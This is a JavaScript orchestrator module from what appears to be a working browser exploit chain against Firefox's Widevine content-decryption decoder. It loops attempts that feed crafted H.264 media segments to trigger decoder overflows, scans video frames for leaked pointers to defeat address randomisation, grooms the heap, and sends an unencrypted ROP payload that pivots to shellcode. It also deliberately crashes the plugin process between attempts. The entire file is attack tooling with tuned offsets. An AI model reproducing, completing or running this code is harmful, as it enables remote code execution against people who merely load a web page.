// Orchestrator: drives one exploit attempt (EME setup → leak → RIP) and loops
// attempts until the leak (leakOnly) or PWN (full) succeeds.
const ORCH_BUILD = 'firefox-PWN-v86';

import { buildCdmLeakAus } from './leak.js?v=v86primers10';
import { buildRipAus } from './rip.js?v=v86defaults';
import { buildInitSegment, annexBAusToMediaSegment } from './mp4.js?v=cleanlive1';
import { FrameReader, scanLeakFrames } from './frame.js?v=singlepool1';
import { setupEme } from './eme.js?v=cleanlive1';
import { buildPcmSlice, buildKillSps, assembleAu } from './h264.js?v=killsps1';

// Benign baseline SPS/PPS — the avcC content Gecko parses at decoder init.
const BENIGN_SPS = new Uint8Array([
  0x67, 0x42, 0xc0, 0x1e, 0xd9, 0x1e, 0xc0, 0x44,
  0x00, 0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x03,
  0x00, 0x28, 0x3c, 0x58, 0xb9, 0x20,
]);
const BENIGN_PPS = new Uint8Array([0x68, 0xcb, 0x83, 0xcb, 0x20]);

// Default knobs for the attempt loop.
export const ORCH_DEFAULTS = {
  maxAttempts: 9999,
  // Candidate RIP-AU1 picbuf offsets (arena-relative); the I_PCM pivot lands in
  // one of these decode-bucket slots.
  picbufVariants: [
    0xac0ea0, 0xac1ca0,
    0xac9120, 0xac9f20,
    0xad13a0, 0xad21a0,
  ],
  arenaTargets: [[0x108060, 0x108000], [0x108068, 0x1080c0]],
  // Per-attempt sleeps (ms), overridable via ?au1Rest / ?leakWait / ?exploitWait.
  au1ToRestSleepMs: 1200,
  leakProcessSleepMs: 1800,
  exploitWaitMs: 700,
  // Multi-emit leak: >1 sends N overflow+EOS rounds, each with a different stride.
  numLeakRounds: 1,
  multiRoundStrideStep: 0x40,
  // Decoder ctx offset; there is only one decoder under the current chain.
  ctxOff: 0x108000,
  width: 16,
  height: 16,
};

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function dumpLeakFrames(reader, log) {
  const frames = reader.frames;
  if (frames.length === 0) {
    log('  no frames captured — decoder never produced output');
    return;
  }
  // For each frame, walk the Y plane as qwords and flag any that look like a
  // heap pointer (hi16 0x7fxx) or an arena self-pointer (low32 in 0x100000..0x140000).
  const MAX_FRAMES = 20;
  const n = Math.min(frames.length, MAX_FRAMES);
  log(`  dumping first ${n} frame(s) Y plane:`);
  for (let fi = 0; fi < n; fi++) {
    const f = frames[fi];
    const y = reader.yPlane(f);
    const dv = new DataView(y.buffer, y.byteOffset, y.byteLength);
    const hits = [];
    const all = [];
    for (let i = 0; i + 8 <= y.byteLength; i += 8) {
      const q = dv.getBigUint64(i, true);
      const hex = q.toString(16).padStart(16, '0');
      all.push(hex);
      if (q === 0n) continue;
      const ptrHi = Number((q >> 32n) & 0xffffn);
      const low = Number(q & 0xffffffffn);
      const isPtr = ptrHi >= 0x7f00 && ptrHi <= 0x7fff;
      if (isPtr) {
        hits.push(`+${i.toString(16)}: ${hex}  [heap-ptr hi=0x${ptrHi.toString(16)}]`);
      } else if (low >= 0x100000 && low <= 0x140000 && ptrHi !== 0) {
        hits.push(`+${i.toString(16)}: ${hex}  [self-ptr low=0x${low.toString(16)}]`);
      }
    }
    log(`    frame[${fi}] ${f.codedWidth}x${f.codedHeight} t=${f.timestamp}` +
        ` y=${y.byteLength}B`);
    // 4 qwords per line, capped at 64 qwords.
    const LINE = 4;
    const CAP = 64;
    for (let i = 0; i < Math.min(all.length, CAP); i += LINE) {
      log(`      +${(i*8).toString(16).padStart(4,'0')}: ${all.slice(i, i+LINE).join(' ')}`);
    }
    if (all.length > CAP) log(`      ... (${all.length - CAP} more qwords)`);
    if (hits.length) {
      log(`    frame[${fi}] candidates:`);
      for (const h of hits) log(`      ${h}`);
    } else {
      log(`    frame[${fi}] no pointer-like qwords`);
    }
  }
}

function snapshotState(sb, video) {
  const vErr = video?.error;
  return [
    `sb.updating=${sb.updating}`,
    `video.readyState=${video?.readyState}`,
    `video.networkState=${video?.networkState}`,
    `video.error=${vErr ? `code=${vErr.code} ${vErr.message ?? ''}` : 'null'}`,
    `buffered=${sb.buffered?.length ?? 0}`,
  ].join(' ');
}

async function appendSegment(sb, segment, video, label = 'segment', opts = {}) {
  const { timeoutMs = 4000, heartbeatMs = 1000, log = () => {} } = opts;
  return new Promise((resolve, reject) => {
    let timer = null;
    let heartbeat = null;
    const cleanup = () => {
      sb.removeEventListener('updateend', onUpdateEnd);
      sb.removeEventListener('error', onSbError);
      sb.removeEventListener('abort', onAbort);
      video.removeEventListener('error', onVideoError);
      if (timer) clearTimeout(timer);
      if (heartbeat) clearInterval(heartbeat);
    };
    const onUpdateEnd = () => { cleanup(); resolve(); };
    const onSbError = () => {
      cleanup();
      const vErr = video?.error;
      reject(new Error(
        `appendSegment(${label}): SourceBuffer 'error'` +
        (vErr ? ` — video.error code=${vErr.code} ${vErr.message ?? ''}` : '')));
    };
    const onAbort = () => {
      cleanup();
      reject(new Error(`appendSegment(${label}): SourceBuffer 'abort'`));
    };
    const onVideoError = () => {
      cleanup();
      const vErr = video?.error;
      reject(new Error(
        `appendSegment(${label}): video 'error'` +
        (vErr ? ` — code=${vErr.code} ${vErr.message ?? ''}` : '')));
    };
    sb.addEventListener('updateend', onUpdateEnd);
    sb.addEventListener('error', onSbError);
    sb.addEventListener('abort', onAbort);
    video.addEventListener('error', onVideoError);
    try {
      sb.appendBuffer(segment);
    } catch (e) {
      cleanup();
      reject(new Error(`appendSegment(${label}): appendBuffer threw: ${e?.name ?? ''} ${e?.message ?? e}`));
      return;
    }
    const start = Date.now();
    heartbeat = setInterval(() => {
      log(`    [${label}] waiting +${Date.now() - start}ms — ${snapshotState(sb, video)}`);
    }, heartbeatMs);
    timer = setTimeout(() => {
      cleanup();
      reject(new Error(`appendSegment(${label}): timed out after ${timeoutMs}ms — ${snapshotState(sb, video)}`));
    }, timeoutMs);
  });
}

async function waitForSourceOpen(ms, timeoutMs = 5000) {
  return new Promise((resolve, reject) => {
    const cleanup = () => {
      ms.removeEventListener('sourceopen', onOpen);
      clearTimeout(t);
    };
    const onOpen = () => { cleanup(); resolve(); };
    ms.addEventListener('sourceopen', onOpen);
    const t = setTimeout(() => {
      cleanup();
      reject(new Error(`MediaSource sourceopen timed out (state=${ms.readyState})`));
    }, timeoutMs);
  });
}

// Run one attempt: open MediaSource, append init+leak, then optionally RIP.
// Returns { cdmBase, arenaBase, pwned } describing the outcome.
async function runAttempt({
  video, log, attemptIdx, opts, mode,
}) {
  log('  step: new MediaSource');
  const ms = new MediaSource();
  video.src = URL.createObjectURL(ms);
  await waitForSourceOpen(ms);

  log('  step: addSourceBuffer');
  const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
  sb.mode = 'segments';

  // The UAT provider mints a fresh KID per license, so we request with a random
  // KID and use the X-Widevine-Key-IDs value the proxy returns for the tenc box.
  const requestedKid = crypto.getRandomValues(new Uint8Array(16));
  const iv = crypto.getRandomValues(new Uint8Array(8));

  log('  step: setupEme');
  const { discoveredKid } = await setupEme({
    video,
    licenseUrl: opts.licenseUrl,
    fetchLicense: opts.fetchLicense,
    defaultKid: requestedKid,
    log,
  });
  const effectiveKid = discoveredKid ?? requestedKid;
  log(`  tenc default_KID = ${Array.from(effectiveKid).map(b => b.toString(16).padStart(2,'0')).join('')}` +
      (discoveredKid ? ' (from license)' : ' (no header — fallback)'));

  log('  step: buildInitSegment + appendBuffer');
  const init = buildInitSegment({
    width: opts.width,
    height: opts.height,
    benignSps: opts.benignSps ?? BENIGN_SPS,
    benignPps: opts.benignPps ?? BENIGN_PPS,
    defaultKid: effectiveKid,
    widevinePsshData: opts.widevinePsshData,
  });
  await appendSegment(sb, init, video, 'init', { log });

  // Leak segment. Debug URL knobs: ?debugS=N forces the wild stride;
  // ?debugNoOverflow=1 sends groom + drain only.
  const debugStrideS = (() => {
    try {
      const u = new URL(window.location.href);
      const v = u.searchParams.get('debugS');
      return v == null ? null : parseInt(v, 10);
    } catch (_) { return null; }
  })();
  const debugNoOverflow = (() => {
    try {
      const u = new URL(window.location.href);
      return u.searchParams.get('debugNoOverflow') === '1';
    } catch (_) { return false; }
  })();
  // ?ripOnly=1: skip the leak and run RIP with placeholder bases (diagnostic).
  const ripOnlyDebug = (() => {
    try {
      const u = new URL(window.location.href);
      return u.searchParams.get('ripOnly') === '1';
    } catch (_) { return false; }
  })();
  const cdmLeakAus = buildCdmLeakAus({
    height: 3,
    debugStrideS,
    debugNoOverflow,
    // Multi-emit: ?numLeakRounds>1 sends N overflow+EOS rounds in one attempt.
    numLeakRounds: opts.numLeakRounds || 1,
    multiRoundStrideStep: opts.multiRoundStrideStep || 0x40,
    // ?primers=N overrides the priming-PCM count.
    numPrimingPcms: (() => {
      try {
        const v = new URL(window.location.href).searchParams.get('primers');
        return v == null ? undefined : parseInt(v, 10);
      } catch (_) { return undefined; }
    })(),
    // Cycle picbuf variants deterministically across attempts.
    attemptIdx: attemptIdx,
  });
  if (debugStrideS !== null) {
    log(`  [debug] using debugStrideS = ${debugStrideS} (${debugStrideS >= 0 ? '+' : ''}0x${(debugStrideS >>> 0).toString(16)})`);
  }
  if (debugNoOverflow) {
    log(`  [debug] debugNoOverflow=1 — chain skips overflow rounds`);
  }
  const arenaLeakAus = [];
  // Lead with a no-SPS PCM keyframe: it's the segment's sync sample, so every
  // following overflow AU is non-sync and reaches the CDM unintercepted.
  const primerAu = assembleAu([buildPcmSlice()]);
  const leakAus = [primerAu].concat(cdmLeakAus).concat(arenaLeakAus);

  const reader = new FrameReader(video);
  reader.start();

  const leakSegment = annexBAusToMediaSegment({
    aus: leakAus,
    sequenceNumber: 1,
    baseMediaDecodeTime: 0,
    iv,
  });
  log(`  step: append leak segment (${leakSegment.length} bytes, ${leakAus.length} AUs)`);
  await appendSegment(sb, leakSegment, video, 'leak', { log });

  video.play().catch(() => {});

  // Log readyState transitions for diagnostics.
  for (const ev of ['waitingforkey', 'canplay', 'canplaythrough', 'playing', 'waiting', 'stalled', 'suspend', 'pause', 'ended', 'error']) {
    video.addEventListener(ev, () => {
      const err = video.error;
      const errStr = err ? ` err.code=${err.code} err.msg='${err.message ?? ''}'` : '';
      log(`    [evt] ${ev} currentTime=${video.currentTime.toFixed(3)} readyState=${video.readyState} paused=${video.paused}${errStr}`);
    }, { once: true });
  }

  // Poll: proceed the moment the scan recovers both bases, falling back to
  // leakProcessSleepMs as a hard timeout for a slow/failed decode.
  let cdmBase = null, arenaBase = null;
  {
    const leakDeadline = Date.now() + opts.leakProcessSleepMs;
    while (Date.now() < leakDeadline) {
      await sleep(150);
      const r = scanLeakFrames(reader.frames, reader);
      if (r.cdmBase && r.arenaBase) { cdmBase = r.cdmBase; arenaBase = r.arenaBase; break; }
    }
  }
  reader.stop();
  if (!cdmBase || !arenaBase) {
    const r = scanLeakFrames(reader.frames, reader);
    cdmBase = cdmBase || r.cdmBase;
    arenaBase = arenaBase || r.arenaBase;
  }

  log(`  reader: ${reader.summary()}` +
      ` (video.currentTime=${video.currentTime.toFixed(3)}` +
      ` paused=${video.paused} readyState=${video.readyState})`);
  log(`  cdm_base   = ${cdmBase ? '0x' + cdmBase.toString(16) : 'FAILED (JS scan)'}`);
  log(`  arena_base (scan) = ${arenaBase ? '0x' + arenaBase.toString(16) : 'FAILED (JS scan)'}`);

  // Optional heuristic: arena_base = cdm_base + delta. Off by default (mode 0)
  // because this VM is dual-pool, so the in-band scan recovers the real arena.
  // ?arenaMode / ?arenaDelta override.
  const FORKSERVER_DELTA_CANDIDATES = [
    0x12ac000n, 0x11ac000n, 0x13ac000n, 0x10ac000n,
    0x14ac000n, 0xfac000n,  0x15ac000n, 0xeac000n,
  ];
  const arenaModeOverride = (() => {
    try {
      const v = new URL(window.location.href).searchParams.get('arenaMode');
      return v == null ? null : parseInt(v, 10);
    } catch (_) { return null; }
  })();
  const arenaDeltaOverride = (() => {
    try {
      const v = new URL(window.location.href).searchParams.get('arenaDelta');
      return v == null ? null : BigInt(v);
    } catch (_) { return null; }
  })();
  // Mode 0 = in-band scan (default); modes 1..N add a delta candidate.
  const modeIdx = arenaDeltaOverride != null ? 1
                : arenaModeOverride != null ? arenaModeOverride
                : 0;
  if (cdmBase && modeIdx > 0) {
    const delta = arenaDeltaOverride != null
                  ? arenaDeltaOverride
                  : FORKSERVER_DELTA_CANDIDATES[(modeIdx - 1) % FORKSERVER_DELTA_CANDIDATES.length];
    const heuristic = cdmBase + delta;
    log(`  arena_base (heuristic mode ${modeIdx}) = 0x${heuristic.toString(16)} = cdm+0x${delta.toString(16)}`);
    arenaBase = heuristic;
  } else if (arenaBase) {
    log(`  arena_base (scan, mode 0) = 0x${arenaBase.toString(16)}`);
  }

  // ?ripOnly=1: force RIP with placeholder bases (the pivot won't run, but the
  // alloc-call fires so a debugger can confirm parse-into-X reached ctx).
  if (ripOnlyDebug && mode === 'full' && (!cdmBase || !arenaBase)) {
    cdmBase = 0x7f8888880000n;
    arenaBase = 0x100020030000n;
    log('  [debug] ripOnly=1 — forcing RIP with placeholder bases');
  }

  // JS scan only; on a miss the attempt fails cleanly and the loop retries.
  if (!cdmBase || !arenaBase) {
    dumpLeakFrames(reader, log);
  }

  if (mode === 'leakOnly' || !cdmBase || !arenaBase) {
    // A failed 'full' attempt sends a kill AU to crash the GMP child so the next
    // attempt starts from a fresh decoder. leakOnly skips this (the kill AU
    // breaks the CDM pipeline) and is measurement-only.
    const skipKillAuUrl = (() => {
      try { return new URL(window.location.href).searchParams.get('skipKillAu') === '1'; }
      catch (_) { return false; }
    })();
    if (mode === 'full' && (!cdmBase || !arenaBase) && !opts.skipKillAu && !skipKillAuUrl) {
      try {
        const killAu = assembleAu([buildKillSps()]);
        const killT = leakAus.length * 3000 + 3000;
        const killSegment = annexBAusToMediaSegment({
          aus: [killAu], sequenceNumber: 2, baseMediaDecodeTime: killT, iv,
        });
        log('  step: append kill AU (force fresh GMP child)');
        // Don't await — the CDM SIGSEGVs on this; just nudge the moof in first.
        appendSegment(sb, killSegment, video, 'killAU', { log, timeoutMs: 3000 })
          .catch((e) => log(`  killAU append: ${e?.message ?? e} (expected on crash)`));
        await sleep(1500);
      } catch (e) {
        log(`  killAU build err: ${e?.message ?? e}`);
      }
    }
    URL.revokeObjectURL(video.src);
    return { cdmBase, arenaBase, pwned: false, discoveredKid };
  }

  // RIP segment. RIP_PICBUF_OFF_CANDIDATES are the decode-bucket slots the AU1
  // I_PCM sled plants the pivot into; rotate picbufOff across them per attempt.
  const RIP_PICBUF_OFF_CANDIDATES = [
    0xab9820, 0xac9120,                        // PWN-confirmed pivot landings
  ];
  const picbufOffRelOverride = (() => {
    try {
      const v = new URL(window.location.href).searchParams.get('picbufOff');
      return v == null ? null : (v.startsWith('0x') ? parseInt(v, 16) : parseInt(v, 10));
    } catch (_) { return null; }
  })();
  const picbufOffRel = picbufOffRelOverride != null ? picbufOffRelOverride
    : RIP_PICBUF_OFF_CANDIDATES[Math.floor(attemptIdx / 2) % RIP_PICBUF_OFF_CANDIDATES.length];
  // ctx[0] is assembled as (arenaHigh<<32)|picbufOff, so fold arena_base's low32
  // into picbufOff (it's nonzero when the arena isn't 4 GB-aligned).
  const arenaLow32 = Number(arenaBase & 0xffffffffn) >>> 0;
  const picbufOff = ((arenaLow32 + picbufOffRel) >>> 0);
  log(`  picbuf_off = 0x${picbufOff.toString(16)} (rel=0x${picbufOffRel.toString(16)} +arenaLow32=0x${arenaLow32.toString(16)}, rot ${attemptIdx % RIP_PICBUF_OFF_CANDIDATES.length}/${RIP_PICBUF_OFF_CANDIDATES.length})`);
  // ctxOff varies per GMP child (0x68000 or 0x108000 base, +0x600 per decoder
  // recreation). Alternate candidates every attempt so the live decoder's ctx is
  // hit on half of them; a wrong ctxOff crashes the child, so the set must
  // contain the real one. ?ctxOff overrides.
  const CTX_OFF_CANDIDATES = [
    0x108600, 0x68600,
  ];
  const ctxOffOverride = (() => {
    try {
      const v = new URL(window.location.href).searchParams.get('ctxOff');
      return v == null ? null : (v.startsWith('0x') ? parseInt(v, 16) : parseInt(v, 10));
    } catch (_) { return null; }
  })();
  const ctxRotIdx = attemptIdx % CTX_OFF_CANDIDATES.length;
  const ctxOffRot = ctxOffOverride != null ? ctxOffOverride : CTX_OFF_CANDIDATES[ctxRotIdx];
  log(`  ctx_off = 0x${ctxOffRot.toString(16)}` +
      (ctxOffOverride != null ? ' (override)' : ` (rot ${ctxRotIdx}/${CTX_OFF_CANDIDATES.length})`));
  // Filler SPSes so the 3 RIP grooms ALLOC contiguous (+0x700).
  const ripFillers = (() => {
    try {
      const v = new URL(window.location.href).searchParams.get('ripFillers');
      return v == null ? 6 : parseInt(v, 10);
    } catch (_) { return 6; }
  })();
  log(`  rip_fillers = ${ripFillers}`);
  // AU5_N also sets where the parser reads X2's width/height; some arena layouts
  // make those garbage and abort, so rotating au5n shifts that read until benign.
  const au5nOverride = (() => {
    try {
      const v = new URL(window.location.href).searchParams.get('au5n');
      if (v != null) return parseInt(v, 10);
    } catch (_) {}
    // Step au5n every 2 attempts over a wide range so a stuck layout recovers fast.
    return 16 + (Math.floor(attemptIdx / 2) % 28);
  })();
  const ripAus = buildRipAus({
    cdmBase, arenaBase, picbufOff, ctxOff: ctxOffRot, fillerCount: ripFillers,
    au5nOverride,
  });

  const baseT2 = leakAus.length * 3000;
  // Co-locate the whole setup in ONE segment — AU1×N (grooms + pivot I_PCM) then
  // AU2-5 (overflow + parse-into) — so the grooms, overflow, and parse-into all
  // hit the same decoder AU6 triggers in. The AU1 sled fills several picbuf slots
  // with the pivot pattern so picbufOff need not match exactly.
  const NUM_AU1_COPIES = 8;
  // ?setupPrimer=1 leads the segment with a no-SPS PCM keyframe to keep the RIP
  // on the leak decoder. Default off: the keyframe AU1 forces one decoder
  // recreation onto a clean slab, which is the PWNing config.
  const useSetupPrimer = (() => {
    try {
      const v = new URL(window.location.href).searchParams.get('setupPrimer');
      return v == null ? false : v !== '0';
    } catch (_) { return false; }
  })();
  // ?au6InSetup (default on): ride AU6 at the end of the setup segment, right
  // after AU5, so no picbuf alloc can clobber ctx[0] between AU5's write and
  // AU6's alloc-call.
  const au6InSetup = (() => {
    try { return new URL(window.location.href).searchParams.get('au6InSetup') !== '0'; }
    catch (_) { return true; }
  })();
  const ripPrimer = assembleAu([buildPcmSlice()]);
  const setupAus = [...(useSetupPrimer ? [ripPrimer] : []),
                    ...new Array(NUM_AU1_COPIES).fill(ripAus[0]),
                    ripAus[1], ripAus[2], ripAus[3], ripAus[4],   // [primer] + AU1×N + AU2-5
                    ...(au6InSetup ? [ripAus[5]] : [])];          // + AU6 (clear) back-to-back
  log(`  setup_primer = ${useSetupPrimer} au6InSetup = ${au6InSetup}`);
  // Unencrypted so AU6's ROP bytes reach bs_buf as plaintext (the cenc path would
  // scramble them); the grooms/overflow SPSes parse the same either way.
  const setupSegment = annexBAusToMediaSegment({
    aus: setupAus, sequenceNumber: 2, baseMediaDecodeTime: baseT2, iv,
    unencrypted: au6InSetup,
  });
  log(`  step: append setup (primer + AU1×${NUM_AU1_COPIES} grooms+pivot + AU2-5${au6InSetup ? ' + AU6' : ''}) in ONE segment`);
  await appendSegment(sb, setupSegment, video, 'setup', { log });

  await sleep(opts.au1ToRestSleepMs);

  // Detect a CDM crash via video error event in the next stretch.
  let crashed = false;
  const onError = () => { crashed = true; };
  video.addEventListener('error', onError, { once: true });

  try {
    // AU6 carries the ROP in its SPS body and must reach the CDM unencrypted.
    // When sent separately it's led by a no-SPS PCM primer so it stays non-sync
    // on the same decoder AU2-5 corrupted (?au6Primer=0 drops the primer).
    const useAu6Primer = (() => {
      try { return new URL(window.location.href).searchParams.get('au6Primer') !== '0'; }
      catch (_) { return true; }
    })();
    if (au6InSetup) {
      log('  step: AU6 already in setup segment (au6InSetup=1) — no separate AU6');
    } else {
      const au6Primer = assembleAu([buildPcmSlice()]);
      const au6Aus = useAu6Primer ? [au6Primer, ripAus[5]] : [ripAus[5]];
      const au6Segment = annexBAusToMediaSegment({
        aus: au6Aus,
        sequenceNumber: 3,
        baseMediaDecodeTime: baseT2 + 3000 * (NUM_AU1_COPIES + 4),
        iv,
        unencrypted: true,
      });
      log(`  step: append AU6 (${useAu6Primer ? 'primer + ' : ''}AU6, unencrypted)`);
      await appendSegment(sb, au6Segment, video, 'AU6', { log });
    }
  } catch (e) {
    crashed = true;
  }

  await sleep(opts.exploitWaitMs);

  if (video.error) crashed = true;
  video.removeEventListener('error', onError);
  URL.revokeObjectURL(video.src);

  // The PWN signal is out-of-band: the shellcode prints "PWNZ0RED" on the GMP
  // child's stdout (= Firefox stdout). `crashed` only flags a GMP crash this
  // attempt (pivot or pre-pivot fault) and is never used as a success oracle.
  return { cdmBase, arenaBase, crashed, discoveredKid };
}

// Top-level driver. `mode` is 'leakOnly' or 'full'.
export async function run({
  video,
  licenseUrl,
  fetchLicense,
  log = (m) => console.log(m),
  mode = 'full',
  ...overrides
} = {}) {
  const opts = { ...ORCH_DEFAULTS, ...overrides, licenseUrl, fetchLicense };
  // Per-attempt timing overrides (ms) via URL params.
  try {
    const p = new URL(window.location.href).searchParams;
    const num = (k) => { const v = p.get(k); return v == null ? null : parseInt(v, 10); };
    const lw = num('leakWait'); if (lw != null) opts.leakProcessSleepMs = lw;
    const ar = num('au1Rest'); if (ar != null) opts.au1ToRestSleepMs = ar;
    const ew = num('exploitWait'); if (ew != null) opts.exploitWaitMs = ew;
  } catch (_) {}
  log(`orchestrator build: ${ORCH_BUILD}`);

  const baseIdx = (typeof opts.attemptIdxOffset === 'number') ? opts.attemptIdxOffset : 0;
  for (let i = 0; i < opts.maxAttempts; i++) {
    log(`\n[attempt ${i + 1}/${opts.maxAttempts}]`);
    let outcome;
    try {
      outcome = await runAttempt({ video, log, attemptIdx: i + baseIdx, opts, mode });
    } catch (e) {
      try {
        console.error('attempt error:', e);
        const name = (typeof e === 'object' && e && 'name' in e) ? e.name : typeof e;
        const msg = (typeof e === 'object' && e && 'message' in e) ? e.message : '';
        log(`  ERR: ${name}${msg ? ': ' + msg : ''}`);
        if (typeof e === 'object' && e && typeof e.stack === 'string') {
          const firstFrame = e.stack.split('\n')[0] || '';
          log(`    at ${firstFrame.trim()}`);
        } else {
          log(`    (raw): ${String(e)}`);
        }
      } catch (loggingErr) {
        console.error('logging error:', loggingErr);
        log(`  ERR: <logging failed: ${loggingErr.message}>`);
      }
      continue;
    }
    // leakOnly succeeds once both bases are recovered from the leak frame.
    if (mode === 'leakOnly' && outcome.cdmBase && outcome.arenaBase) {
      log(`\n=== LEAK SUCCEEDED  cdm_base=0x${outcome.cdmBase.toString(16)}` +
          `  arena_base=0x${outcome.arenaBase.toString(16)} ===`);
      return outcome;
    }
    if (mode === 'leakOnly' && outcome.cdmBase) {
      log(`  (partial: cdm_base=0x${outcome.cdmBase.toString(16)}, arena_base still missing)`);
    }
    // No in-band success oracle; keep attempting and watch the log for PWNZ0RED.
    if (outcome.crashed) {
      log('  attempt ended with GMP crash (pivot-or-fault — see Firefox stdout)');
    }
  }
  log(`\n=== ALL ${opts.maxAttempts} ATTEMPTS FAILED ===`);
  return null;
}
